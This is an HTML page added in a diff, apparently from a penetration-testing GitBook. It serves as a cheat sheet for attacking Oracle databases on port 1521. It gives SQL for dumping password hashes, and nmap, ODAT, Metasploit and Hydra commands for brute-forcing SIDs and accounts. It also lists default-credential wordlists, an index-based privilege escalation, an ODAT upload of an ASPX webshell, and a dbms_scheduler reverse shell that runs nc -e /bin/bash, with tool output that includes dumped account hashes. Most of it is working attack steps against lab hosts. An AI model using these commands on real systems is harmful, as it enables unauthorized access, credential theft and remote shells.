+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.9.16" data-path="../../tools/nfsshell.html">
+            
+                <a href="../../tools/nfsshell.html">
+            
+                    
+                    nfsshell
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.9.17" data-path="../../tools/powerupsql.html">
+            
+                <a href="../../tools/powerupsql.html">
+            
+                    
+                    PowerUpSQL
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.9.18" data-path="../../tools/metasploit/">
+            
+                <a href="../../tools/metasploit/">
+            
+                    
+                    Metasploit
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.9.18.1" data-path="../../tools/metasploit/msfvenom.html">
+            
+                <a href="../../tools/metasploit/msfvenom.html">
+            
+                    
+                    msfvenom
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.10" data-path="../../others.html">
+            
+                <a href="../../others.html">
+            
+                    
+                    Others
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            Published with GitBook
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href="../../.." >1521 - Oracle DB</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
+                                <h1 id="1521---oracle-db">1521 - Oracle DB</h1>
+<p>Port: 1521</p>
+<h2 id="commands">Commands</h2>
+<p>Check privileges:</p>
+<p><code>select * from user_role_privs;</code></p>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">Type</th>
+<th style="text-align:left">Command</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">Version</td>
+<td style="text-align:left">SELECT banner FROM v$version WHERE banner LIKE &#x2018;Oracle%&#x2019;; SELECT banner FROM v$version WHERE banner LIKE &#x2018;TNS%&#x2019;; SELECT version FROM v$instance;</td>
+</tr>
+<tr>
+<td style="text-align:left">Comments</td>
+<td style="text-align:left">SELECT 1 FROM dual &#x2014; comment &#x2013; NB: SELECT statements must have a FROM clause in Oracle so we have to use the dummy table name &#x2018;dual&#x2019; when we&#x2019;re not actually selecting from a table.</td>
+</tr>
+<tr>
+<td style="text-align:left">Current User</td>
+<td style="text-align:left">SELECT user FROM dual</td>
+</tr>
+<tr>
+<td style="text-align:left">List Users</td>
+<td style="text-align:left">SELECT username FROM all_users ORDER BY username;  SELECT name FROM sys.user$; &#x2014; priv</td>
+</tr>
+<tr>
+<td style="text-align:left">List Password Hashes</td>
+<td style="text-align:left">SELECT name, password, astatus FROM sys.user$ &#x2014; priv, &lt;= 10g.  astatus tells you if acct is locked  SELECT name,spare4 FROM sys.user$ &#x2014; priv, 11g</td>
+</tr>
+<tr>
+<td style="text-align:left">Password Cracker</td>
+<td style="text-align:left"><a href="http://www.red-database-security.com/software/checkpwd.html" target="_blank">checkpwd</a> will crack the DES-based hashes from Oracle 8, 9 and 10.</td>
+</tr>
+<tr>
+<td style="text-align:left">List Privileges</td>
+<td style="text-align:left">SELECT * FROM session_privs; &#x2014; current privs  SELECT * FROM dba_sys_privs WHERE grantee = &#x2018;DBSNMP&#x2019;; &#x2014; priv, list a user&#x2019;s privs  SELECT grantee FROM dba_sys_privs WHERE privilege = &#x2018;SELECT ANY DICTIONARY&#x2019;; &#x2014; priv, find users with a particular priv  SELECT GRANTEE, GRANTED_ROLE FROM DBA_ROLE_PRIVS;</td>
+</tr>
+<tr>
+<td style="text-align:left">List DBA Accounts</td>
+<td style="text-align:left">SELECT DISTINCT grantee FROM dba_sys_privs WHERE ADMIN_OPTION = &#x2018;YES&#x2019;; &#x2014; priv, list DBAs, DBA roles</td>
+</tr>
+<tr>
+<td style="text-align:left">Current Database</td>
+<td style="text-align:left">SELECT global_name FROM global_name;  SELECT name FROM v$database;  SELECT instance_name FROM v$instance;  SELECT SYS.DATABASE_NAME FROM DUAL;</td>
+</tr>
+<tr>
+<td style="text-align:left">List Databases</td>
+<td style="text-align:left">SELECT DISTINCT owner FROM all_tables; &#x2014; list schemas (one per user) &#x2013; Also query TNS listener for other databases.  See <a href="http://www.jammed.com/~jwa/hacks/security/tnscmd/tnscmd-doc.html" target="_blank">tnscmd</a> (services \</td>
+<td>status).</td>
+</tr>
+<tr>
+<td style="text-align:left">List Columns</td>
+<td style="text-align:left">SELECT column_name FROM all_tab_columns WHERE table_name = &#x2018;blah&#x2019;; SELECT column_name FROM all_tab_columns WHERE table_name = &#x2018;blah&#x2019; and owner = &#x2018;foo&#x2019;;</td>
+</tr>
+<tr>
+<td style="text-align:left">List Tables</td>
+<td style="text-align:left">SELECT table_name FROM all_tables;  SELECT owner, table_name FROM all_tables;</td>
+</tr>
+<tr>
+<td style="text-align:left">Find Tables From Column Name</td>
+<td style="text-align:left">SELECT owner, table_name FROM all_tab_columns WHERE column_name LIKE &#x2018;%PASS%&#x2019;; &#x2014; NB: table names are upper case</td>
+</tr>
+<tr>
+<td style="text-align:left">Select Nth Row</td>
+<td style="text-align:left">SELECT username FROM (SELECT ROWNUM r, username FROM all_users ORDER BY username) WHERE r=9; &#x2014; gets 9th row (rows numbered from 1)</td>
+</tr>
+<tr>
+<td style="text-align:left">Select Nth Char</td>
+<td style="text-align:left">SELECT substr(&#x2018;abcd&#x2019;, 3, 1) FROM dual; &#x2014; gets 3rd character, &#x2018;c&#x2019;</td>
+</tr>
+<tr>
+<td style="text-align:left">Bitwise AND</td>
+<td style="text-align:left">SELECT bitand(6,2) FROM dual; &#x2014; returns 2  SELECT bitand(6,1) FROM dual; &#x2014; returns0</td>
+</tr>
+<tr>
+<td style="text-align:left">ASCII Value -&gt; Char</td>
+<td style="text-align:left">SELECT chr(65) FROM dual; &#x2014; returns A</td>
+</tr>
+<tr>
+<td style="text-align:left">Char -&gt; ASCII Value</td>
+<td style="text-align:left">SELECT ascii(&#x2018;A&#x2019;) FROM dual; &#x2014; returns 65</td>
+</tr>
+<tr>
+<td style="text-align:left">Casting</td>
+<td style="text-align:left">SELECT CAST(1 AS char) FROM dual;  SELECT CAST(&#x2019;1&#x2032; AS int) FROM dual;</td>
+</tr>
+<tr>
+<td style="text-align:left">String Concatenation</td>
+<td style="text-align:left">SELECT &#x2018;A&#x2019; \</td>
+<td>\</td>
+<td>&#x2018;B&#x2019; FROM dual; &#x2014; returns AB</td>
+</tr>
+<tr>
+<td style="text-align:left">If Statement</td>
+<td style="text-align:left">BEGIN IF 1=1 THEN dbms_lock.sleep(3); ELSE dbms_lock.sleep(0); END IF; END; &#x2014; doesn&#x2019;t play well with SELECT statements</td>
+</tr>
+<tr>
+<td style="text-align:left">Case Statement</td>
+<td style="text-align:left">SELECT CASE WHEN 1=1 THEN 1 ELSE 2 END FROM dual; &#x2014; returns 1  SELECT CASE WHEN 1=2 THEN 1 ELSE 2 END FROM dual; &#x2014; returns 2</td>
+</tr>
+<tr>
+<td style="text-align:left">Avoiding Quotes</td>
+<td style="text-align:left">SELECT chr(65) \</td>
+<td>\</td>
+<td>chr(66) FROM dual; &#x2014; returns AB</td>
+</tr>
+<tr>
+<td style="text-align:left">Time Delay</td>
+<td style="text-align:left">BEGIN DBMS_LOCK.SLEEP(5); END; &#x2014; priv, can&#x2019;t seem to embed this in a SELECT  SELECT UTL_INADDR.get_host_name(&#x2019;10.0.0.1&#x2032;) FROM dual; &#x2014; if reverse looks are slow  SELECT UTL_INADDR.get_host_address(&#x2018;blah.attacker.com&#x2019;) FROM dual; &#x2014; if forward lookups are slow  SELECT UTL_HTTP.REQUEST(&#x2018;<a href="http://google.com&#x2019;\" target="_blank">http://google.com&#x2019;\</a>) FROM dual; &#x2014; if outbound TCP is filtered / slow &#x2013; Also see <a href="http://technet.microsoft.com/en-us/library/cc512676.aspx" target="_blank">Heavy Queries</a> to create a time delay</td>
+</tr>
+<tr>
+<td style="text-align:left">Make DNS Requests</td>
+<td style="text-align:left">SELECT UTL_INADDR.get_host_address(&#x2018;google.com&#x2019;) FROM dual;  SELECT UTL_HTTP.REQUEST(&#x2018;<a href="http://google.com&#x2019;\" target="_blank">http://google.com&#x2019;\</a>) FROM dual;</td>
+</tr>
+<tr>
+<td style="text-align:left">Command Execution</td>
+<td style="text-align:left"><a href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql" target="_blank">Java</a>can be used to execute commands if it&#x2019;s installed.<a href="http://www.0xdeadbeef.info/exploits/raptor_oraextproc.sql" target="_blank">ExtProc</a> can sometimes be used too, though it normally failed for me. <img src="http://pentestmonkey.net/wp-includes/images/smilies/icon_sad.gif" alt=":-\("></td>
+</tr>
+<tr>
+<td style="text-align:left">Local File Access</td>
+<td style="text-align:left"><a href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql" target="_blank">UTL_FILE</a> can sometimes be used.  Check that the following is non-null:  SELECT value FROM v$parameter2 WHERE name = &#x2018;utl_file_dir&#x2019;;<a href="http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql" target="_blank">Java</a> can be used to read and write files if it&#x2019;s installed (it is not available in Oracle Express).</td>
+</tr>
+<tr>
+<td style="text-align:left">Hostname, IP Address</td>
+<td style="text-align:left">SELECT UTL_INADDR.get_host_name FROM dual;  SELECT host_name FROM v$instance;  SELECT UTL_INADDR.get_host_address FROM dual; &#x2014; gets IP address  SELECT UTL_INADDR.get_host_name(&#x2019;10.0.0.1&#x2032;) FROM dual; &#x2014; gets hostnames</td>
+</tr>
+<tr>
+<td style="text-align:left">Location of DB files</td>
+<td style="text-align:left">SELECT name FROM V$DATAFILE;</td>
+</tr>
+<tr>
+<td style="text-align:left">Default/System Databases</td>
+<td style="text-align:left">SYSTEM  SYSAUX</td>
+</tr>
+</tbody>
+</table>
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="oscanner">oscanner</h3>
+<p>Install oscanner: </p>
+<p><code>apt-get install oscanner</code>   </p>
+<p>Run oscanner: </p>
+<p><code>oscanner -s 192.168.1.200 -P 1521</code>  </p>
+<h3 id="tnscmd10g">tnscmd10g</h3>
+<p>Fingerprint Oracle TNS Version </p>
+<p>Fingerprint oracle tns: </p>
+<p><code>tnscmd10g version -h TARGET</code> </p>
+<h3 id="nmap">Nmap</h3>
+<p><strong>Run nmap scripts against Oracle TNS:</strong> </p>
+<p><code>nmap -p 1521 -A TARGET</code> </p>
+<p>Find tns version:</p>
+<p><code>nmap --script=oracle-tns-version</code>  </p>
+<p><strong>Brute force oracle user accounts</strong> </p>
+<p>Identify default Oracle databases: </p>
+<pre><code class="lang-text">nmap --script oracle-sid-brute -p 1521 10.10.10.82
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-02 13:52 BST
+Nmap scan report for 10.10.10.82
+Host is up (0.084s latency).
+
+PORT     STATE SERVICE
+1521/tcp open  oracle
+| oracle-sid-brute: 
+|_  XE
+</code></pre>
+<p>brute force users using the SID:</p>
+<p><code>nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=ORCL &lt;host&gt;</code></p>
+<p>or</p>
+<pre><code class="lang-text">nmap --script oracle-enum-users --script-args oracle-enum-users.sid=ORCL,userdb=orausers.txt -p 1521-1560 &lt;host&gt;
+</code></pre>
+<h3 id="odat">ODAT</h3>
+<p>[<a href="https://github.com/quentinhardy/odat" target="_blank">https://github.com/quentinhardy/odat</a>
+](<a href="https://github.com/quentinhardy/odat" target="_blank">https://github.com/quentinhardy/odat</a></p>
+<p>)</p>
+<p>ODAT&#x202F;(Oracle Database Attacking Tool) is an open source&#x202F;penetration testing&#x202F;tool that tests the security of&#x202F;Oracle Databases remotely. </p>
+<p>Usage examples of ODAT: </p>
+<ul>
+<li>You have an Oracle database listening remotely and want to find valid&#x202F;SIDs&#x202F;and&#x202F;credentials&#x202F;in order to connect to the database </li>
+<li>You have a valid Oracle account on a database and want to&#x202F;escalate your privileges&#x202F;to become DBA or SYSDBA </li>
+<li>You have a Oracle account and you want to&#x202F;execute system commands&#x202F;(e.g.&#x202F;reverse shell) in order to move forward on the operating system hosting the database </li>
+</ul>
+<p>Tested on Oracle Database&#x202F;10g,&#x202F;11g,&#x202F;12c&#x202F;and&#x202F;18c. </p>
+<p><strong>Install</strong>: download the latest release from the github repo</p>
+<p><strong>Examples</strong>: </p>
+<h4 id="identify-sids">Identify SIDs</h4>
+<pre><code class="lang-text">root@kali:/opt/odat-libc2.5-i686# odat sidguesser -s 10.10.10.82 
+
+[1] (10.10.10.82:1521): Searching valid SIDs 
+[1.1] Searching valid SIDs thanks to a well known SID list on the 10.10.10.82:1521 server 
+[+] &apos;XE&apos; is a valid SID. Continue... 
+[+] &apos;XEXDB&apos; is a valid SID. Continue... 
+100% |#####################################################################################################################################################| Time: 00:03:49 
+[1.2] Searching valid SIDs thanks to a brute-force attack on 1 chars now (10.10.10.82:1521) 
+100% |#####################################################################################################################################################| Time: 00:00:09 
+[1.3] Searching valid SIDs thanks to a brute-force attack on 2 chars now (10.10.10.82:1521) 
+[+] &apos;XE&apos; is a valid SID. Continue... 
+100% |#####################################################################################################################################################| Time: 00:03:20 
+[+] SIDs found on the 10.10.10.82:1521 server: XE,XEXDB
+</code></pre>
+<h4 id="identify-users">identify users:</h4>
+<pre><code class="lang-text">./odat-libc2.12-x86_64 passwordguesser -s 10.10.10.82 -d XE --accounts-file accounts/default.txt
+
+[1] (10.10.10.82:1521): Searching valid accounts on the 10.10.10.82 server, port 1521
+[+] Valid credentials found: scott/tiger. Continue...                                   ##################################################################                                         | ETA:  00:00:05 
+100% |#############################################################################################################################################################################################| Time: 00:00:24 
+[+] Accounts found on 10.10.10.82:1521/XE: 
+scott/tiger
+</code></pre>
+<p><strong>use the the wordlist below for just the default accounts</strong></p>
+<p>find vulnarable modules:</p>
+<pre><code class="lang-text">odat all -s 10.10.10.82 -d XE -U SCOTT -P tiger --sysdba
+</code></pre>
+<p><strong>Upload shell</strong></p>
+<pre><code class="lang-text">./odat-libc2.12-x86_64 dbmsadvisor -s 10.10.10.82 -d XE -U SCOTT -P tiger --sysdba --putFile C:\\inetpub\\wwwroot 0xdf.aspx /usr/share/webshells/aspx/cmdasp.aspx
+</code></pre>
+<h4 id="get-files">Get files</h4>
+<pre><code class="lang-text">./odat.py utlfile -s &lt;IP&gt; -d &lt;SID&gt; -U &lt;username&gt; -P &lt;password&gt; --getFile &quot;C:/test&quot; token.txt token.txt
+</code></pre>
+<h3 id="metasploit">Metasploit</h3>
+<h4 id="sid-bruteforce">sid bruteforce:</h4>
+<pre><code class="lang-text">msf auxiliary(admin/oracle/sid_brute) &gt; run 
+
+[*] 10.10.10.82:1521 - Starting brute force on 10.10.10.82, using sids from /usr/share/metasploit-framework/data/wordlists/sid.txt... 
+[+] 10.10.10.82:1521 - 10.10.10.82:1521 Found SID &apos;XE&apos; 
+[+] 10.10.10.82:1521 - 10.10.10.82:1521 Found SID &apos;PLSExtProc&apos; 
+[+] 10.10.10.82:1521 - 10.10.10.82:1521 Found SID &apos;CLRExtProc&apos; 
+[+] 10.10.10.82:1521 - 10.10.10.82:1521 Found SID &apos;&apos; 
+[*] 10.10.10.82:1521 - Done with brute force... 
+[*] Auxiliary module execution completed
+</code></pre>
+<h4 id="tns-version">tns version:</h4>
+<pre><code class="lang-text">auxiliary/scanner/oracle/tnslsnr_version
+</code></pre>
+<h4 id="sid-enum">sid enum:</h4>
+<pre><code class="lang-text">auxiliary/scanner/oracle/sid_enum
+</code></pre>
+<h4 id="username-enumeration">username enumeration:</h4>
+<pre><code class="lang-text">use auxiliary/scanner/oracle/oracle_login
+</code></pre>
+<h4 id="index-priv-esc">index priv esc:</h4>
+<pre><code class="lang-text">msf &gt; use auxiliary/admin/oracle/oracle_index_privesc
+msf auxiliary(oracle_index_privesc) &gt; show actions
+    ...actions...
+msf auxiliary(oracle_index_privesc) &gt; set ACTION &lt; action-name &gt;
+msf auxiliary(oracle_index_privesc) &gt; show options
+    ...show and set options...
+msf auxiliary(oracle_index_privesc) &gt; run
+</code></pre>
+<h4 id="execute-sql-queries">execute sql queries:</h4>
+<pre><code class="lang-text">use auxiliary/admin/oracle/oracle_sql
+</code></pre>
+<h4 id="enumerate-the-database">enumerate the database:</h4>
+<pre><code class="lang-text">use auxiliary/admin/oracle/oraenum
+msf auxiliary(oraenum) &gt; info
+
+Name: Oracle Database Enumeration
+Module: auxiliary/admin/oracle/oraenum
+License: Metasploit Framework License (BSD)
+Rank: Normal
+
+Provided by:
+Carlos Perez &lt;carlos_perez@darkoperator.com&gt;
+
+Basic options:
+Name    Current Setting  Required  Description
+----    ---------------  --------  -----------
+DBPASS  TIGER            yes       The password to authenticate with.
+DBUSER  SCOTT            yes       The username to authenticate with.
+RHOST                    yes       The Oracle host.
+RPORT   1521             yes       The TNS port.
+SID     ORCL             yes       The sid to authenticate with.
+
+Description:
+This module provides a simple way to scan an Oracle database server
+for configuration parameters that may be useful during a penetration
+test. Valid database credentials must be provided for this module to
+run.
+
+msf auxiliary(oraenum) &gt; set RHOST 192.168.56.163
+RHOST =&gt; 192.168.56.163
+msf auxiliary(oraenum) &gt; set SID KNUTSEL
+SID =&gt; KNUTSEL
+msf auxiliary(oraenum) &gt; set dbpass tiger
+dbpass =&gt; tiger
+msf auxiliary(oraenum) &gt; run
+
+[*] Running Oracle Enumeration....
+[*] The versions of the Components are:
+[*]      Oracle Database 11g Enterprise Edition Release 11.2.0.1.0 - 64bit Production
+[*]      PL/SQL Release 11.2.0.1.0 - Production
+[*]      CORE     11.2.0.1.0     Production
+[*]      TNS for Linux: Version 11.2.0.1.0 - Production
+[*]      NLSRTL Version 11.2.0.1.0 - Production
+[*] Auditing:
+[*]      Database Auditing is enabled!
+[*]      Auditing of SYS Operations is not enabled!
+[*] Security Settings:
+[*]      SQL92 Security restriction on SELECT is not Enabled
+[*]      UTL Directory Access is set to
+[*]      Audit log is saved at /u01/app/oracle/admin/KNUTSEL/adump
+[*] Password Policy:
+[*]      Current Account Lockout Time is set to 1
+[*]      The Number of Failed Logins before an account is locked is set to 10
+[*]      The Password Grace Time is set to 7
+[*]      The Lifetime of Passwords is set to 180
+[*]      The Number of Times a Password can be reused is set to UNLIMITED
+[*]      The Maximum Number of Times a Password needs to be changed before it can be reused is set to UNLIMITED
+[*]      The Number of Times a Password can be reused is set to UNLIMITED
+[*]      Password Complexity is not checked
+[*] Active Accounts on the System in format Username,Password,Spare4 are:
+[*]      SYS,03E1E7984F880583,S:3CD57915E74AF162A5ABA3A30FE453E43DF884CB6A552C647B03572BA46D
+[*]      SYSTEM,5A7270D7D12F6BA6,S:EDCB23E4039293C352B12D01EA52F2AF3311B5FA744BE3DCC728BDFE0655
+[*]      DBSNMP,57E9C5ECCAB1777C,S:D9576CA642448980FB5C04D3869614D572E712BF5E019E02C31BBF300E76
+[*]      SYSMAN,CB3E68076FBBAFF5,S:1132C132BFA6686735DEC4398F30DD411F0DDCAAAFCB4AC21527887B7129
+[*]      MGMT_VIEW,23C5225CD5C2C782,S:0983A18B9809980B2ABE7A7A4047E5AA3925DC184C92047B6F5404E8CD11
+[*]      APP_USER,71B0EFF101D0D5AC,S:13BAA4B46E85969429B3242E64E526292EB15BA071E3AAF37649CD3289BA
+[*]      SCOTT,F894844C34402B67,S:7ED8346E4DA9EE29ACBB4A9D08B2E18B57404E6A9A03DB6AF01024BC0B8F
+[*] Expired or Locked Accounts on the System in format Username,Password,Spare4 are:
+[*]      OUTLN,4A3BA55E08595C81,S:8DF2965A946AB7ED6F6657A99B91CC792B67BF873D7CAFD3B20C98A28370
+[*]      DIP,CE4A36B8E06CA59C,S:3E265D395D4D1A637729747CECC8BAD1CD8EFA262A8377E5635BB94434C5
+[*]      ORACLE_OCM,5A2E026A9157958C,S:CDC4C09C00C4A8C25DCD1062BF8EC8BCB468841A1C77AB6E65188DF24D99
+[*]      APPQOSSYS,519D632B7EE7F63A,S:B388B593D8609871990A15E991C82ACA154B0ADDA84E7CB549CFCC6E9B94
+[*]      WMSYS,7C9BA362F8314299,S:A38520037B1C3904B76B3B65E8605DA4F89F710345F60FC7406A3FE9B709
+[*]      XS$NULL,DC4FCC8CB69A6733,S:0327C110E72AE2E82F08AACBBBD385E4589FA1386F20119E1EE2A6AC8DC4
+[*]      EXFSYS,33C758A8E388DEE5,S:BA1BB1B61AA7FE91BFF3CA99A116C2299F2DA8F87398D5560C20B74EDD00
+[*]      XDB,88D8364765FCE6AF,S:7E885EEAC286739730FEDD138F83A361204D96FB92E35FFBDD89A494E32B
+[*]      ANONYMOUS,anonymous,
+[*]      APEX_PUBLIC_USER,E0781A84AA9234A8,S:934C76C08882384A2C51644F9C8302D40D32BFB83524BC4EC9EB84CA0221
+[*]      ORDSYS,7EFA02EC7EA6B86F,S:74C72073718541C8074E24B1210367A6D702C01064580BFF4E5719AD8ECD
+[*]      ORDDATA,A93EC937FCD1DC2A,S:C7267CE01C7CDCD0AF39C4289B7C66A3E0E75EAA3DC47D6143984256A9F1
+[*]      ORDPLUGINS,88A2B2C183431F00,S:554026F9CFABC573E6A7B439716F69AF45A33D969FE7C16AA2E8CF702E34
+[*]      SI_INFORMTN_SCHEMA,84B8CBCA4D477FA3,S:1C2A0B249085C3CEED0B29019231E49F35A56CDB8E0653B1E38E39B5AB8E
+[*]      MDSYS,72979A94BAD2AF80,S:FE9431C8FA6CD61C1741389012B7D7B9ABD4213A612286E83E45F3E50A9E
+[*]      FLOWS_FILES,110F19A4A024EB24,S:EB5CC126B7E3198814CC1B06065AF0E15259706E4036431D15F809527816
+[*]      APEX_030200,A1A70E91605C5567,S:36A4A6B16BC8D55287D3E672FD86D72EA63C3749640A9DD668122E702F1E
+[*] Accounts with DBA Privilege  in format Username,Hash on the System are:
+[*]      SYS
+[*]      APP_USER
+[*]      SYSTEM
+[*] Accounts with Alter System Privilege on the System are:
+[*]      SYS
+[*]      DBA
+[*]      APEX_030200
+[*] Accounts with JAVA ADMIN Privilege on the System are:
+[*] Accounts that have CREATE LIBRARY Privilege on the System are:
+[*]      SYS
+[*]      XDB
+[*]      EXFSYS
+[*]      MDSYS
+[*]      DBA
+[*] Default password check:
+[*]      The account DIP has a default password.
+[*]      The account MDSYS has a default password.
+[*]      The account XS$NULL has a default password.
+[*]      The account OUTLN has a default password.
+[*]      The account EXFSYS has a default password.
+[*]      The account ORACLE_OCM has a default password.
+[*]      The account SCOTT has a default password.
+[*]      The account ORDPLUGINS has a default password.
+[*]      The account ORDSYS has a default password.
+[*]      The account APPQOSSYS has a default password.
+[*]      The account ORDDATA has a default password.
+[*]      The account XDB has a default password.
+[*]      The account SI_INFORMTN_SCHEMA has a default password.
+[*]      The account WMSYS has a default password.
+[*] Auxiliary module execution completed
+</code></pre>
+<h3 id="hydra">Hydra</h3>
+<p>brute-force a listener password if exists:</p>
+<pre><code class="lang-text">./hydra -P rockyou.txt -t 32 -s 1521 host.victim oracle-listener
+</code></pre>
+<h2 id="default-accounts">Default accounts</h2>
+<table>
+<thead>
+<tr>
+<th style="text-align:left">Username</th>
+<th style="text-align:left">Password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left">SYSTEM</td>
+<td style="text-align:left">MANAGER</td>
+</tr>
+<tr>
+<td style="text-align:left">SYS</td>
+<td style="text-align:left">CHANGE_ON_INSTALL</td>
+</tr>
+<tr>
+<td style="text-align:left">DBSNMP</td>
+<td style="text-align:left">DBSNMP</td>
+</tr>
+<tr>
+<td style="text-align:left">SCOTT</td>
+<td style="text-align:left">TIGER</td>
+</tr>
+<tr>
+<td style="text-align:left">PCMS_SYS</td>
+<td style="text-align:left">PCMS_SYS</td>
+</tr>
+<tr>
+<td style="text-align:left">WMSYS</td>
+<td style="text-align:left">WMSYS</td>
+</tr>
+<tr>
+<td style="text-align:left">OUTLN</td>
+<td style="text-align:left">OUTLN</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Try lowercase as well</strong></p>
+<p><strong>wordlist:</strong></p>
+<pre><code class="lang-text">SYSTEM/MANAGER
+SYS/CHANGE_ON_INSTALL
+DBSNMP/DBSNMP
+SCOTT/TIGER
+PCMS_SYS/PCMS_SYS
+WMSYS/WMSYS
+OUTLN/OUTLN
+system/manager
+sys/change_on_install
+dbsnmp/dbsnmp
+scott/tiger
+pcms_sys/pcms_sys
+wmsys/wmsys
+outln/outln
+</code></pre>
+<h2 id="connecting-to-oracle-db">Connecting to Oracle DB</h2>
+<p>To interact with Oracle from our Kali box, there are three tools that can come in handy.&#x202F;sqlplus&#x202F;is required for&#x202F;odat&#x202F;to work properly: </p>
+<p>Sqlplus will be installed with odat. So just install odat (apt install odat) </p>
+<h3 id="connect-as-normal-user">Connect as normal user:</h3>
+<pre><code class="lang-text">root@kali:~/hackthebox/silo# sqlplus SCOTT/tiger@10.10.10.82:1521/XE 
+SQL*Plus: Release 12.2.0.1.0 Production on Thu Apr 26 08:54:27 2018 
+
+Copyright (c) 1982, 2016, Oracle.  All rights reserved. 
+
+Connected to: 
+Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production 
+
+SQL&gt;
+</code></pre>
+<h3 id="connect-as-sysdba">Connect as sysdba:</h3>
+<pre><code class="lang-text">sqlplus SCOTT/tiger@10.10.10.82:1521/XE as sysdba
+</code></pre>
+<h2 id="privilege-escalation">Privilege escalation</h2>
+<p><strong>Can also do the Metasploit module</strong></p>
+<p> <em>**</em>Oracle priv esc and obtain DBA access: </p>
+<p><strong>Run netcat</strong>: netcat -nvlp 443 code </p>
+<p><code>SQL&gt; create index exploit_1337 on SYS.DUAL(SCOTT.GETDBA(&apos;BAR&apos;));</code> </p>
+<p><strong>Run the exploit with a select query:</strong> </p>
+<p><code>SQL&gt; Select * from session_privs;</code>  </p>
+<p><strong>Remove the exploit using:</strong> </p>
+<p><code>drop index exploit_1337;</code> </p>
+<h4 id="odat">ODAT</h4>
+<pre><code class="lang-text">./odat.py privesc -s $SERVER -d $ID -U $USER -P $PASSWORD -h #Get module Help
+</code></pre>
+<h2 id="reverse-shell-1">reverse shell #1</h2>
+<pre><code class="lang-text">Get Oracle Reverse os-shell:
+begin
+dbms_scheduler.create_job( job_name    =&gt; &apos;MEH1337&apos;,job_type    =&gt;
+    &apos;EXECUTABLE&apos;,job_action =&gt; &apos;/bin/nc&apos;,number_of_arguments =&gt; 4,start_date =&gt;
+    SYSTIMESTAMP,enabled    =&gt; FALSE,auto_drop =&gt; TRUE); 
+dbms_scheduler.set_job_argument_value(&apos;rev_shell&apos;, 1, &apos;TARGET-IP&apos;);
+dbms_scheduler.set_job_argument_value(&apos;rev_shell&apos;, 2, &apos;443&apos;);
+dbms_scheduler.set_job_argument_value(&apos;rev_shell&apos;, 3, &apos;-e&apos;);
+dbms_scheduler.set_job_argument_value(&apos;rev_shell&apos;, 4, &apos;/bin/bash&apos;);
+dbms_scheduler.enable(&apos;rev_shell&apos;); 
+end;
+</code></pre>
+<h2 id="reverse-shell-1">reverse shell #1</h2>
+<pre><code class="lang-text">find vulnarable modules:
+odat all -s 10.10.10.82 -d XE -U SCOTT -P tiger --sysdba
+
+upload shell:
+./odat-libc2.12-x86_64 dbmsadvisor -s 10.10.10.82 -d XE -U SCOTT -P tiger --sysdba --putFile C:\\inetpub\\wwwroot 0xdf.aspx /usr/share/webshells/aspx/cmdasp.aspx
+</code></pre>
+<h2 id="resources">Resources:</h2>
+<p><a href="https://medium.com/@netscylla/oracle-hacks-part-2-b1ccb1916d1f" target="_blank">https://medium.com/@netscylla/oracle-hacks-part-2-b1ccb1916d1f</a></p>
+
+                                
+                                </section>
+                            
+    </div>
+    <div class="search-results">
+        <div class="has-results">
+            
+            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
+            <ul class="search-results-list"></ul>
+            
+        </div>
+        <div class="no-results">
+            
+            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
+            
+        </div>
+    </div>
+</div>
+
+                        </div>
+                    </div>
+                
+            </div>
+
+            
+                
+                <a href="1433-microsoft-sql.html" class="navigation navigation-prev " aria-label="Previous page: 1433 - Microsoft SQL">
+                    <i class="fa fa-angle-left"></i>
+                </a>
+                
+                
+                <a href="nfs.html" class="navigation navigation-next " aria-label="Next page: 2049 - NFS">
+                    <i class="fa fa-angle-right"></i>
+                </a>
+                
+            
+        
+    </div>
+
+    <script>
+        var gitbook = gitbook || [];
+        gitbook.push(function() {
+            gitbook.page.hasChanged({"page":{"description":"Oracle Database is a multi-model database management system produced and marketed by Oracle Corporation.","title":"1521 - Oracle DB","level":"2.1.3.24","depth":3,"next":{"title":"2049 - NFS","level":"2.1.3.25","depth":3,"path":"infrastructure-testing/enumeration/services-ports/nfs.md","ref":"infrastructure-testing/enumeration/services-ports/nfs.md","articles":[]},"previous":{"title":"1433 - Microsoft 